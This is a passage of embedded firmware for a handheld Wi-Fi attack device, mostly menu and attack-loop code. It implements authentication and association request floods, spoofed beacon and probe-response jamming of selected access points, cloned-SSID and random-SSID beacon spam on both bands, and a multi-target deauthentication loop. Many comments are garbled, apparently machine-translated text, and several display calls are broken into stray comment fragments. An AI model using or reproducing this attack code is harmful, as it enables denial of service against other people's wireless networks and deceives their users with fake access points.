  //.setForegroundColor(SSD1306_WHITE);

  // Title
  oledDrawCenteredLine("[BroadcastRunMedium]", 18);

  // Status
  oledDrawCenteredLine(status.c_str(), 32);

  // Hint
  const char* bottomHint = "TargetAPBeaconData";
  int hintWidth = //.getUTF8Width(bottomHint);
  int hintX = (//width() - hintWidth) / 2;
  //.setCursor(hintX, 46);
  //.print(bottomHint);

  if (clearDisplay) {
    ////);
  }
}

// ===== RequestSend：HeightCertify/Request =====
void drawRequestFloodStatus(const String& ssid, bool clearDisplay = true) {
  if (clearDisplay) {
    //clearDisplay();
  }
  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);
  oledDrawCenteredLine("[DosAttackFrameSendMedium]", 18);
  oledDrawCenteredLine(ssid.c_str(), 32);
  if (clearDisplay) ////);
}

void RequestFlood() {
  if (SelectedVector.empty()) {
    showModalMessage("Not FoundValidSSID");
    return;
  }

  // TargetTargetSSID，AttackMediumTarget
  String displaySSID = scan_results[SelectedVector[0]].ssid;
  if (SelectedVector.size() > 1) {
    displaySSID = "TargetAttackMedium";
  }

  drawRequestFloodStatus(displaySSID);
  startAttackLED();

  // BuildTargetInfo
  struct TargetInfo {
    String ssid;
    const uint8_t* bssid;
    int channel;
  };

  std::vector<TargetInfo> targets;
  targets.reserve(SelectedVector.size());

  for (int selectedIndex : SelectedVector) {
    if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
      TargetInfo target;
      target.ssid = scan_results[selectedIndex].ssid;
      target.bssid = scan_results[selectedIndex].bssid;
      target.channel = scan_results[selectedIndex].channel;
      targets.push_back(target);
    }
  }

  uint8_t staMac[6];
  AuthReqFrame arf; size_t arflen;
  AssocReqFrame asf; size_t asflen;

  while (true) {
    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
      digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
      delay(200);
      stabilizeButtonState();
      if (showConfirmModal("StopDosAttack")) {
        break;
      } else {
        startAttackLED();
        drawRequestFloodStatus(displaySSID);
      }
    }

    // TargetAttack
    for (const auto& target : targets) {
      wext_set_channel(WLAN0_NAME, target.channel);

      // STA MAC，BuildSend
      generateRandomMAC(staMac);
      arflen = wifi_build_auth_req(staMac, (void*)target.bssid, arf);
      asflen = wifi_build_assoc_req(staMac, (void*)target.bssid, target.ssid.c_str(), asf);

      // ：LargeAddPacket，HeightAttackRSSI
      for (int i = 0; i < 20; i++) { wifi_tx_raw_frame(&arf, arflen); }
      for (int i = 0; i < 25; i++) { wifi_tx_raw_frame(&asf, asflen); }

      // Target，HeightAttack
    }
  }
}

void LinkJammer() {
  if (SelectedVector.empty()) {
    showModalMessage("Not FoundValidSSID");
    return;
  }

  // TargetTargetSSID，AttackMediumTarget
  String displaySSID = scan_results[SelectedVector[0]].ssid;
  if (SelectedVector.size() > 1) {
    displaySSID = "TargetAttackMedium";
  }

  // UsageFuncStatus
  drawLinkJammerStatusPage(displaySSID);

  // LEDHint
  startAttackLED();

  // BuildTargetFrame
  struct TargetFrame {
    String ssid;
    const uint8_t* bssid;
    int channel;
    BeaconFrame bf;
    size_t blen;
    ProbeRespFrame prf;
    size_t prlen;
  };

  std::vector<TargetFrame> targets;
  targets.reserve(SelectedVector.size());

  for (int selectedIndex : SelectedVector) {
    if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
      TargetFrame target;
      target.ssid = scan_results[selectedIndex].ssid;
      target.bssid = scan_results[selectedIndex].bssid;
      target.channel = scan_results[selectedIndex].channel;

      // BuildFrame
      uint8_t tempMac[6];
      memcpy(tempMac, target.bssid, 6);
      target.blen = wifi_build_beacon_frame(tempMac, (void*)BROADCAST_MAC, target.ssid.c_str(), target.bf);
      target.prlen = wifi_build_probe_resp_frame(tempMac, (void*)BROADCAST_MAC, target.ssid.c_str(), target.prf);

      targets.push_back(target);
    }
  }

  // TargetChannelList：
  std::vector<int> channels;
  channels.reserve(sizeof(allChannels)/sizeof(allChannels[0]));
  for (int ch : allChannels) channels.push_back(ch);



  while (true) {
    // Stop：OK/BACK  -> Confirm
    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
      digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
      delay(200);
      // Status，ConfirmSpam
      stabilizeButtonState();
      if (showConfirmModal("StopConnectJam")) {
        break;
      } else {
        // CancelResumeAttack，StartLED
        startAttackLED();
        drawLinkJammerStatusPage(displaySSID);
      }
    }

    for (int ch : channels) {
      // ChannelStatus
      if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
        digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
        delay(200);
        // Status，ConfirmSpam
        stabilizeButtonState();
        if (showConfirmModal("StopConnectJam")) {
          return; // Back，ExitFunc
        } else {
          // CancelResumeAttack，StartLED
          startAttackLED();
          drawLinkJammerStatusPage(displaySSID);
        }
      }

      wext_set_channel(WLAN0_NAME, ch);

      // TargetSendFrame，ChannelOpt
      for (const auto& target : targets) {
        // LargeHeightSendRate，LargeAttack
        for (int i = 0; i < 25; i++) {
          wifi_tx_raw_frame((void*)&target.bf, target.blen);
        }
        for (int i = 0; i < 30; i++) {
          wifi_tx_raw_frame((void*)&target.prf, target.prlen);
        }
        // Target，HeightAttack
      }
      // Channel，HeightAttackRate
    }
  }
}

void BeaconTamper() {
  if (SelectedVector.empty()) {
    if (showSelectSSIDConfirmModal()) {
      drawssid(); // AP/SSIDSelect
    }
    return;
  }

  // TargetTargetSSID，AttackMediumTarget
  String displaySSID = scan_results[SelectedVector[0]].ssid;
  if (SelectedVector.size() > 1) {
    displaySSID = "TargetMedium";
  }

  // UsageFuncStatus
  drawBeaconTamperStatusPage(displaySSID);

  // LEDHint
  startAttackLED();

  // BuildTargetFrame
  struct TargetFrame {
    String ssid;
    const uint8_t* bssid;
    int channel;
    BeaconFrame bf;
    size_t blen;
    ProbeRespFrame prf;
    size_t prlen;
  };

  std::vector<TargetFrame> targets;
  targets.reserve(SelectedVector.size());

  // MediumAP
  for (int selectedIndex : SelectedVector) {
    if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
      TargetFrame target;
      target.ssid = "[~]";  // SSID
      target.bssid = scan_results[selectedIndex].bssid;
      target.channel = scan_results[selectedIndex].channel;

      // BuildFrame
      uint8_t tempMac[6];
      memcpy(tempMac, target.bssid, 6);
      target.blen = wifi_build_beacon_frame(tempMac, (void*)BROADCAST_MAC, target.ssid.c_str(), target.bf);
      target.prlen = wifi_build_probe_resp_frame(tempMac, (void*)BROADCAST_MAC, target.ssid.c_str(), target.prf);

      targets.push_back(target);
    }
  }

  // TargetChannelList：
  std::vector<int> channels;
  channels.reserve(sizeof(allChannels)/sizeof(allChannels[0]));
  for (int ch : allChannels) channels.push_back(ch);

  while (true) {
    // Stop：OK/BACK  -> Confirm
    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
      digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
      delay(200);
      // Status，ConfirmSpam
      stabilizeButtonState();
      if (showConfirmModal("StopBroadcast")) {
        break;
      } else {
        // CancelResumeAttack，StartLED
        startAttackLED();
        drawBeaconTamperStatusPage(displaySSID);
      }
    }

    for (int ch : channels) {
      // ChannelStatus
      if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
        digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
        delay(200);
        // Status，ConfirmSpam
        stabilizeButtonState();
        if (showConfirmModal("StopBroadcast")) {
          return; // Back，ExitFunc
        } else {
          // CancelResumeAttack，StartLED
          startAttackLED();
          drawBeaconTamperStatusPage(displaySSID);
        }
      }

      wext_set_channel(WLAN0_NAME, ch);

      // TargetSendFrame，ChannelOpt
      for (const auto& target : targets) {
        // LargeHeightSendRate，LargeAttack
        for (int i = 0; i < 25; i++) {
          wifi_tx_raw_frame((void*)&target.bf, target.blen);
        }
        for (int i = 0; i < 30; i++) {
          wifi_tx_raw_frame((void*)&target.prf, target.prlen);
        }
        // Target，HeightAttack
      }
      // Channel，HeightAttackRate
    }
  }
}

// ChannelSendBeaconFrame（Web UIVersion，UsageBeaconFrame）
void sendBeaconOnChannelWeb(int channel, const char* ssid, int cloneCount, int sendCount, int delayMs = 0) {
  wext_set_channel(WLAN0_NAME, channel);
  for (int c = 0; c < cloneCount; c++) {
    uint8_t tempMac[6];
    generateRandomMAC(tempMac);
    // WebUIPath："Clone"，；Length<=32
    //  "(ab)"，4（ASCII）。
    int maxBaseBytes = 32 - 4; if (maxBaseBytes < 0) maxBaseBytes = 0;
    String base = utf8TruncateByBytes(String(ssid), maxBaseBytes);
    String fakeSsid = createFakeSSID(base);
    const char *fakeSsidCstr = fakeSsid.c_str();

    BeaconFrame bf;
    size_t blen = wifi_build_beacon_frame(tempMac, (void *)BROADCAST_MAC, fakeSsidCstr, bf);

    for (int x = 0; x < sendCount; x++) {
      wifi_tx_raw_frame(&bf, blen);
      if (delayMs > 0) delay(delayMs);
    }
    if (delayMs > 0) delay(delayMs * 2); // Clone
  }
}

// ExecBeaconAttackCore
void executeCrossBandBeaconAttack(const String& ssid, int originalChannel, bool isStableMode = false) {
  // AttackParamConfig
  struct AttackConfig {
    int originalCloneCount;
    int originalSendCount;
    int crossCloneCount;
    int crossSendCount;
    int delayMs;
  };

  AttackConfig config;
  if (isStableMode) {
    // Mode
    config = {5, 3, 4, 2, 2};
  } else {
    // Mode
    config = {10, 5, 8, 4, 0};
  }

  if (is24GChannel(originalChannel)) {
    // 2.4GSSID：Channel5GChannelSendBeacon

    // 2.4GChannel
    if ((beaconBandMode == 0) || (beaconBandMode == 2)) {
      sendBeaconOnChannel(originalChannel, ssid.c_str(),
                         config.originalCloneCount, config.originalSendCount, config.delayMs);
    }

    // 5GBeaconFrame（5GChannel）
    if ((beaconBandMode == 0) || (beaconBandMode == 1)) {
      int fiveGChannels[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
      for (int fiveGCh : fiveGChannels) {
        sendBeaconOnChannel(fiveGCh, ssid.c_str(),
                           config.crossCloneCount, config.crossSendCount, config.delayMs);
        if (isStableMode) delay(5); // Channel，HeightAttack
      }
    }
  } else if (is5GChannel(originalChannel)) {
    // 5GSSID：Channel2.4GChannelSendBeacon

    // 5GChannel
    if ((beaconBandMode == 0) || (beaconBandMode == 1)) {
      sendBeaconOnChannel(originalChannel, ssid.c_str(),
                         config.originalCloneCount, config.originalSendCount, config.delayMs);
    }

    // 2.4GBeaconFrame（2.4GChannel）
    if ((beaconBandMode == 0) || (beaconBandMode == 2)) {
      int two4GChannels[] = {1, 6, 11}; // 2.4GChannel
      for (int two4GCh : two4GChannels) {
        sendBeaconOnChannel(two4GCh, ssid.c_str(),
                           config.crossCloneCount, config.crossSendCount, config.delayMs);
        if (isStableMode) delay(5); // Channel，HeightAttack
      }
    }
  }
}
// ExecBeaconAttackCore（Web UIVersion）
void executeCrossBandBeaconAttackWeb(const String& ssid, int originalChannel, bool isStableMode = false) {
  // AttackParamConfig
  struct AttackConfig {
    int originalCloneCount;
    int originalSendCount;
    int crossCloneCount;
    int crossSendCount;
    int delayMs;
  };

  AttackConfig config;
  if (isStableMode) {
    // Mode
    config = {10, 3, 4, 2, 2};
  } else {
    // Mode
    config = {10, 5, 8, 4, 0};
  }

  if (is24GChannel(originalChannel)) {
    // 2.4GSSID：Channel5GChannelSendBeacon

    // 2.4GChannel
    if ((beaconBandMode == 0) || (beaconBandMode == 2)) {
      sendBeaconOnChannelWeb(originalChannel, ssid.c_str(),
                             config.originalCloneCount, config.originalSendCount, config.delayMs);
    }

    // 5GBeaconFrame（5GChannel）
    if ((beaconBandMode == 0) || (beaconBandMode == 1)) {
      int fiveGChannels[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
      for (int fiveGCh : fiveGChannels) {
        sendBeaconOnChannelWeb(fiveGCh, ssid.c_str(),
                               config.crossCloneCount, config.crossSendCount, config.delayMs);
        if (isStableMode) delay(3); // Channel，LargeAttack
      }
    }
  } else if (is5GChannel(originalChannel)) {
    // 5GSSID：Channel2.4GChannelSendBeacon

    // 5GChannel
    if ((beaconBandMode == 0) || (beaconBandMode == 1)) {
      sendBeaconOnChannelWeb(originalChannel, ssid.c_str(),
                             config.originalCloneCount, config.originalSendCount, config.delayMs);
    }

    // 2.4GBeaconFrame（2.4GChannel）
    if ((beaconBandMode == 0) || (beaconBandMode == 2)) {
      int two4GChannels[] = {1, 6, 11}; // 2.4GChannel
      for (int two4GCh : two4GChannels) {
        sendBeaconOnChannelWeb(two4GCh, ssid.c_str(),
                               config.crossCloneCount, config.crossSendCount, config.delayMs);
        if (isStableMode) delay(3); // Channel，LargeAttack
      }
    }
  }
}
void Beacon() {
  Serial.println("=== StartCloneAP() ===");
  Serial.println("AttackMode: CloneAP()");
  Serial.println("AttackRSSI: 10");

  //clearDisplay();
  //setTextColor(SSD1306_WHITE);
  //setTextSize(1);

  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);
  oledDrawCenteredLine("CloneBeaconFrame", 25);

  // LED：
  startAttackLED();

  unsigned long prevBlink = 0;
  bool redState = true;
  const int blinkInterval = 800;

  // OLED：GenSSID，Target0.5s，Target1s
  const int ssidLineY = 42;
  static unsigned long lastSSIDDrawMs = 0;
  bool singleTargetDrawn = false;

  while (true) {
    unsigned long now = millis();

    if (now - prevBlink >= blinkInterval) {
      redState = !redState;
      digitalWrite(LED_R, redState ? HIGH : LOW);
      prevBlink = now;
    }

    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      // ConfirmSpam
      if (showConfirmModal("ConfirmStopAttack")) {
        BeaconMenu();
        break;
      }
      // CancelResumeAttack，StartLED
      startAttackLED();
      // AttackStatus，ConfirmSpam
      //clearDisplay();
      //.setFontMode(1);
      //.setForegroundColor(SSD1306_WHITE);
      oledDrawCenteredLine("CloneBeaconFrame", 25);
    }

    if (!SelectedVector.empty()) {
      // Target：；Target：1s
      unsigned long intervalMs = (SelectedVector.size() > 1) ? 1000UL : 0UL;
      for (int selectedIndex : SelectedVector) {
        if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
          String ssid1 = scan_results[selectedIndex].ssid;
          int ch = scan_results[selectedIndex].channel;

          // UsageBeaconAttackFunc（Mode）
          executeCrossBandBeaconAttack(ssid1, ch, false);

          // Target；Target
          if (SelectedVector.size() == 1) {
            if (!singleTargetDrawn) {
              String fakeName = createFakeSSID(ssid1);
              oledDrawCenteredLine(fakeName.c_str(), ssidLineY);
              singleTargetDrawn = true;
            }
          } else {
            String fakeName = createFakeSSID(ssid1);
            oledMaybeDrawCenteredLine(fakeName.c_str(), ssidLineY, lastSSIDDrawMs, intervalMs);
          }
        }
      }
    } else {
      // SelectSSID，AttackScanNetwork（Target，1s）
      const unsigned long intervalMs = 1000UL;
      for (size_t i = 0; i < scan_results.size(); i++) {
        String ssid1 = scan_results[i].ssid;
        int ch = scan_results[i].channel;

        // UsageBeaconAttackFunc（Mode）
        executeCrossBandBeaconAttack(ssid1, ch, false);

        String fakeName = createFakeSSID(ssid1);
        oledMaybeDrawCenteredLine(fakeName.c_str(), ssidLineY, lastSSIDDrawMs, intervalMs);
      }
    }
  }
}

void StableBeacon() {
  Serial.println("=== StartCloneAP() ===");
  Serial.println("AttackMode: CloneAP()");
  Serial.println("AttackRSSI: 5 (Mode)");

  //clearDisplay();
  //setTextColor(SSD1306_WHITE);
  //setTextSize(1);

  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);
  oledDrawCenteredLine("CloneBeaconFrame", 25);

  // LED：
  startAttackLED();

  unsigned long prevBlink = 0;
  bool redState = true;
  const int blinkInterval = 800;

  // OLED：GenSSID，Target0.5s，Target1s
  const int ssidLineY = 42;
  static unsigned long lastSSIDDrawMs = 0;
  bool singleTargetDrawn = false;

  while (true) {
    unsigned long now = millis();

    if (now - prevBlink >= blinkInterval) {
      redState = !redState;
      digitalWrite(LED_R, redState ? HIGH : LOW);
      prevBlink = now;
    }

    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      // ConfirmSpam
      if (showConfirmModal("ConfirmStopAttack")) {
        BeaconMenu();
        break;
      }
      // CancelResumeAttack，StartLED
      startAttackLED();
      // AttackStatus，ConfirmSpam
      //clearDisplay();
      //.setFontMode(1);
      //.setForegroundColor(SSD1306_WHITE);
      oledDrawCenteredLine("CloneBeaconFrame", 25);
    }

    if (!SelectedVector.empty()) {
      unsigned long intervalMs = (SelectedVector.size() > 1) ? 1000UL : 0UL;
      for (int selectedIndex : SelectedVector) {
        if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
          String ssid1 = scan_results[selectedIndex].ssid;
          int ch = scan_results[selectedIndex].channel;

          // UsageBeaconAttackFunc（Mode）
          executeCrossBandBeaconAttack(ssid1, ch, true);

          // Target；Target
          if (SelectedVector.size() == 1) {
            if (!singleTargetDrawn) {
              String fakeName = createFakeSSID(ssid1);
              oledDrawCenteredLine(fakeName.c_str(), ssidLineY);
              singleTargetDrawn = true;
            }
          } else {
            String fakeName = createFakeSSID(ssid1);
            oledMaybeDrawCenteredLine(fakeName.c_str(), ssidLineY, lastSSIDDrawMs, intervalMs);
          }
        }
      }
    } else {
      // SelectSSID，AttackScanNetwork（Target，1s）
      const unsigned long intervalMs = 1000UL;
      for (size_t i = 0; i < scan_results.size(); i++) {
        String ssid1 = scan_results[i].ssid;
        int ch = scan_results[i].channel;

        // UsageBeaconAttackFunc（Mode）
        executeCrossBandBeaconAttack(ssid1, ch, true);

        String fakeName = createFakeSSID(ssid1);
        oledMaybeDrawCenteredLine(fakeName.c_str(), ssidLineY, lastSSIDDrawMs, intervalMs);
      }
    }
  }
}
// OLED SelectMenu： / 5G / 2.4G
// Back true Confirm beaconBandMode；Back false Cancel（BACK）
bool BeaconBandMenu() {
  int state = beaconBandMode; // Mode

  while (true) {
    if (digitalRead(BTN_BACK) == LOW) {
      delay(200);
      return false;
    }
    if (digitalRead(BTN_OK) == LOW) {
      delay(200);
      beaconBandMode = state;
      return true;
    }
    if (digitalRead(BTN_UP) == LOW) {
      delay(200);
      if (state > 0) state--;
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      delay(200);
      if (state < 2) state++;
    }

    //clearDisplay();
    //setTextSize(1);

    // Title
    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);
    //.setCursor(32, 12);
    //.print("[SelectPacket]");

    // Options：，5G，2.4G
    const char* items[] = {"(2.4G+5G)", "5G ", "2.4G "};
    for (int i = 0; i < 3; i++) {
      int yPos = 20 + i * 16; // 20Start，TitleSpace
      if (i == state) {
        //fillRoundRect(0, yPos-2, //width(), 14, 2, SSD1306_WHITE);
        //.setFontMode(1);
        //.setForegroundColor(SSD1306_BLACK);
        //.setCursor(5, yPos+10);
        //.print(items[i]);
        drawRightChevron(yPos-2, 14, true);
      } else {
        //.setFontMode(1);
        //.setForegroundColor(SSD1306_WHITE);
        //.setCursor(5, yPos+10);
        //.print(items[i]);
        drawRightChevron(yPos-2, 14, false);
      }
    }
    ////);
    delay(50);
  }
}
String generateRandomString(int len){
  String randstr = "";
  const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (int i = 0; i < len; i++){
    int index = random(0,strlen(setchar));
    randstr += setchar[index];

  }
  return randstr;
}
char randomString[19];
void RandomBeacon() {
  Serial.println("=== StartBeaconAttack ===");
  Serial.println("AttackMode: BeaconAttack");
  Serial.println("AttackRSSI: 10");

  //clearDisplay();
  //setTextColor(SSD1306_WHITE);
  //setTextSize(1);

  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);
  oledDrawCenteredLine("BeaconAttackMedium", 25);

  // LED：
  startAttackLED();

  unsigned long prevBlink = 0;
  bool redState = true;
  const int blinkInterval = 800;

  // OLED："AttackMedium..."SSID（）
  const int ssidLineY = 42; //
  static unsigned long lastSSIDDrawMs = 0;
  const unsigned long randomSSIDIntervalMs = 500; // 0.5s

  std::vector<int> targetChannels;

  if (!SelectedVector.empty()) {
    for (int selectedIndex : SelectedVector) {
      if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
        int channel = scan_results[selectedIndex].channel;
        bool channelExists = false;
        for (int existingChannel : targetChannels) {
          if (existingChannel == channel) {
            channelExists = true;
            break;
          }
        }
        if (!channelExists) {
          // Select
          bool include = (beaconBandMode == 0) || (beaconBandMode == 2 && is24GChannel(channel)) || (beaconBandMode == 1 && is5GChannel(channel));
          if (include) targetChannels.push_back(channel);
        }
      }
    }
  } else {
    for (int channel : allChannels) {
      bool include = (beaconBandMode == 0) || (beaconBandMode == 2 && is24GChannel(channel)) || (beaconBandMode == 1 && is5GChannel(channel));
      if (include) targetChannels.push_back(channel);
    }
  }

  while (true) {
    unsigned long now = millis();

    if (now - prevBlink >= blinkInterval) {
      redState = !redState;
      digitalWrite(LED_R, redState ? HIGH : LOW);
      prevBlink = now;
    }

    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      // ConfirmSpam
      if (showConfirmModal("ConfirmStopAttack")) {
        BeaconMenu();
        break;
      }
      // CancelResumeAttack，StartLED
      startAttackLED();
      // AttackStatus，ConfirmSpam
      //clearDisplay();
      //.setFontMode(1);
      //.setForegroundColor(SSD1306_WHITE);
      oledDrawCenteredLine("BeaconAttackMedium", 25);
    }

    int randomIndex = random(0, targetChannels.size());
    int randomChannel = targetChannels[randomIndex];

    String ssid2 = generateRandomString(10);

    for (int i = 0; i < 6; i++) {
      byte randomByte = random(0x00, 0xFF);
      snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
    }

    const char * ssid_cstr2 = ssid2.c_str();
    wext_set_channel(WLAN0_NAME, randomChannel);

    for (int x = 0; x < 5; x++) {
      wifi_tx_beacon_frame(randomString, (void *)BROADCAST_MAC, ssid_cstr2);
    }

    // Mode：Beacon，
    if (beaconBandMode == 0) {
      // ：Channel
      int altCh = is24GChannel(randomChannel) ? 36 : 6;
      wext_set_channel(WLAN0_NAME, altCh);
      for (int x = 0; x < 2; x++) {
        wifi_tx_beacon_frame(randomString, (void *)BROADCAST_MAC, ssid_cstr2);
      }
    }

    // OLEDMediumSSID（0.5，Center）
    oledMaybeDrawCenteredLine(ssid_cstr2, ssidLineY, lastSSIDDrawMs, randomSSIDIntervalMs);
  }
}
int becaonstate = 0;

void BeaconMenu(){
  becaonstate = 0;

  // ，/Attack
  unsigned long lastUpTime = 0;
  unsigned long lastDownTime = 0;
  unsigned long lastBackTime = 0;
  unsigned long lastOkTime = 0;

  while (true) {
    unsigned long currentTime = millis();
    if(digitalRead(BTN_BACK)==LOW) {
      if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
      drawattack();
      break;
    }
    if(digitalRead(BTN_OK)==LOW){
      if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
      stabilizeButtonState(); // Fix：Spam
      if(becaonstate == 0){
        if (BeaconBandMenu()) {
          if (showConfirmModal("ExecBeaconFrameAttack")) {
            RandomBeacon();
            break;
          }
        }
        // ConfirmMenu
      }
      if(becaonstate == 1){
        if (SelectedVector.empty()) {
          if (showSelectSSIDConfirmModal()) {
            drawssid(); // AP/SSIDSelect
          }
        }
        else {
          if (BeaconBandMenu()) {
            if (showConfirmModal("ExecBeaconFrameAttack")) {
              Beacon();
              break;
            }
          }
        }
        // ConfirmMenu
      }
      if(becaonstate == 2){
        if (SelectedVector.empty()) {
          if (showSelectSSIDConfirmModal()) {
            drawssid(); // AP/SSIDSelect
          }
        }
        else {
          if (BeaconBandMenu()) {
            if (showConfirmModal("ExecBeaconFrameAttack")) {
              StableBeacon();
              break;
            }
          }
        }
        // ConfirmMenu
      }
      if(becaonstate == 3){
        drawattack();
        break;
      }
      lastOkTime = currentTime;
    }
    if(digitalRead(BTN_UP)==LOW){
      if (currentTime - lastUpTime <= DEBOUNCE_DELAY) continue;
      if(becaonstate > 0){
        int yFrom = 2 + becaonstate * 16;
        becaonstate--;
        int yTo = 2 + becaonstate * 16;
        animateMoveFullWidth(yFrom, yTo, 14, drawBeaconMenuBase_NoFlush, 2);
      }
      lastUpTime = currentTime;
    }
    if(digitalRead(BTN_DOWN)==LOW){
      if (currentTime - lastDownTime <= DEBOUNCE_DELAY) continue;
      if(becaonstate < 3){
        int yFrom = 2 + becaonstate * 16;
        becaonstate++;
        int yTo = 2 + becaonstate * 16;
        animateMoveFullWidth(yFrom, yTo, 14, drawBeaconMenuBase_NoFlush, 2);
      }
      lastDownTime = currentTime;
    }

    //clearDisplay();
    //setTextSize(1);

    // Menu Item
    const char* menuItems[] = {
      "BeaconAttack",
      "CloneAP()",
      "CloneAP()",
      "《 Back 》"
    };

    // Menu Item - Height14，Spacing2，Length16，128x64
    for (int i = 0; i < 4; i++) {
      int yPos = 2 + i * 16;
      if (i == becaonstate) {
        //fillRoundRect(0, yPos-2, //width(), 14, 2, SSD1306_WHITE);
        //.setFontMode(1);
        //.setForegroundColor(SSD1306_BLACK);
        //.setCursor(5, yPos+10);
        //.print(menuItems[i]);
        drawRightChevron(yPos-2, 14, true);
      } else {
        //.setFontMode(1);
        //.setForegroundColor(SSD1306_WHITE);
        //.setCursor(5, yPos+10);
        //.print(menuItems[i]);
        drawRightChevron(yPos-2, 14, false);
      }
    }

    ////);
    delay(50);
  }
}

// ：Channel，TargetChannel，burst Usage interFrameDelayMs
void StableAutoMulti() {
  Serial.println("=== StartAttack ===");
  Serial.println("AttackMode: Attack");
  Serial.println("AttackRSSI: " + String(perdeauth));

  showAttackStatusPage("AttackMedium");

  // LED：
  startAttackLED();

  unsigned long prevBlink = 0;
  bool redState = true;
  const int blinkInterval = 600;
  unsigned long buttonCheckTime = 0;
  const int buttonCheckInterval = 120;

  // InitTargetList（ AutoMulti ）
  if (smartTargets.empty() && !SelectedVector.empty()) {
    for (int selectedIndex : SelectedVector) {
      if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
        TargetInfo target;
        memcpy(target.bssid, scan_results[selectedIndex].bssid, 6);
        target.channel = scan_results[selectedIndex].channel;
        target.active = true;
        smartTargets.push_back(target);
      }
    }
    lastScanTime = millis();
  }

  // Config：BSSID burst = perdeauth ，Frame
  const unsigned int interFrameDelayUs = 100;  // Frame，250100，HeightAttackRSSI

  while (true) {
    // UpdateAttackStatus
    showAttackStatusPage("AttackMedium");

    unsigned long currentTime = millis();

    // LED
    if (currentTime - prevBlink >= blinkInterval) {
      redState = !redState;
      digitalWrite(LED_R, redState ? HIGH : LOW);
      prevBlink = currentTime;
    }

    // Button
    if (currentTime - buttonCheckTime >= buttonCheckInterval) {
      if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
        digitalWrite(LED_R, LOW);
        digitalWrite(LED_G, LOW);
        digitalWrite(LED_B, LOW);
        delay(200);
        // ConfirmSpam
        if (showConfirmModal("ConfirmStopAttack")) {
          return; // ConfirmStopAttack
        }
        // CancelResumeAttack，StartLED
        startAttackLED();
      }
      buttonCheckTime = currentTime;
    }

    // Target（10）
    if (currentTime - lastScanTime >= SCAN_INTERVAL) {
      std::vector<WiFiScanResult> backup = scan_results;
      updateSmartTargets();
      if (scan_results.empty()) {
        scan_results = std::move(backup);
      }
      lastScanTime = currentTime;
    }

    if (smartTargets.empty()) {
      delay(100);
      continue;
    }

    // Channel，Channel，（）
    channelBucketsCache.clearBuckets();
    for (const auto &t : smartTargets) {
      if (t.active) {  // AttackTarget
        channelBucketsCache.add(t.channel, t.bssid);
      }
    }

    int packetCount = 0;
    for (size_t chIdx = 0; chIdx < channelBucketsCache.buckets.size(); chIdx++) {
      if (channelBucketsCache.buckets[chIdx].empty()) continue;
      wext_set_channel(WLAN0_NAME, allChannels[chIdx]);
      for (const uint8_t *bssidPtr : channelBucketsCache.buckets[chIdx]) {
        if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
          digitalWrite(LED_R, LOW);
          digitalWrite(LED_G, LOW);
          digitalWrite(LED_B, LOW);
          delay(200);
          // ConfirmSpam
          if (showConfirmModal("ConfirmStopAttack")) {
            return; // ConfirmStopAttack
          }
          // CancelResumeAttack，StartLED
          startAttackLED();
        }
        // Usageburst（），ValidRate
        sendDeauthBurstToBssidUs(bssidPtr, perdeauth, packetCount, interFrameDelayUs);

        if (packetCount >= 200) { // Hint
          digitalWrite(LED_R, HIGH);
          delay(30);
          digitalWrite(LED_R, LOW);
          packetCount = 0;
        }
      }
    }

    delay(10);
  }
}

void DeauthMenu() {
  deauthstate = 0;
  int startIndex = 0;  // Quote
  const int MAX_DISPLAY_ITEMS = 4; // 4
  const int ITEM_HEIGHT = 16; // ProjHeight
  const int Y_OFFSET = 2; // Y

  // ，/Attack
  unsigned long lastUpTime = 0;
  unsigned long lastDownTime = 0;
  unsigned long lastBackTime = 0;
